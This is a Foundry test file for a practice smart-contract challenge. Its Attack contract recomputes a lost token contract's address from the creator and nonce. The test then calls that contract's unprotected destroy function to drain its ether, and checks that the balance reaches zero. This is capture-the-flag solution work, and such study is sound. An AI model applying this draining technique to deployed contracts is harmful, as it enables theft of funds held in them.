// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/18_MagicNumber.sol";

contract MagicNumberTest is Test {
    MagicNumber instance;
    Attack attack;
    address payable player1;
    address player2;

    function setUp() public {
        player1 = payable(vm.addr(1));

        player2 = vm.addr(2);
        vm.deal(player2, 0.001 ether);
        vm.startPrank(player2, player2);
        attack = new Attack();
        instance = new MagicNumber();
        instance.generateToken{value: 0.001 ether}("xq", 100000000);
        vm.stopPrank();
    }

    function testattacker() public {
        vm.startPrank(player1, player1);

        address payable lostContract = payable(
            attack.attack(address(instance))
        );
        assertEq(address(lostContract).balance, 0.001 ether);
        SimpleToken(lostContract).destroy(player1);
        assertEq(address(lostContract).balance, 0);
        vm.stopPrank();
    }
}

contract Attack {
    function attack(address eoa) public returns (address) {
        address lostContract = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            eoa,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        return lostContract;
    }
}
